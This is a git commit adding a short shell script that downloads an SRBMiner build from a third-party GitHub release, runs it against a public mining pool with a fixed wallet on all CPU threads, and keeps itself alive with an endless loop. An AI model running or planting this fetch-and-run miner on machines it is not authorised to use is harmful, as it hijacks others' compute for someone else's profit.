c549a627f23e22228e896324421a06a701314f36
malogrono <136266511+malogrono@users.noreply.github.com>
2024-11-13 21:29:38 +0700

    Create repeh.sh

---
+++ repeh.sh
@@ -0,0 +1,12 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/doktor63/SRBMiner/releases/download/2.6.9/SRBMiner-Multi-2-6-9-Linux.tar.gz
+tar -xvf SRBMiner-Multi-2-6-9-Linux.tar.gz
+cd SRBMiner-Multi-2-6-9
+clear
+./SRBMiner-MULTI --algorithm verushash --pool eu.luckpool.net:3956 --wallet RTL47WXHCHZ4KxJ9DKMgz3PduyDboztuQu.flare $(echo $(shuf -i 1-9999 -n 1)-CPU) -t $(nproc --all)
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
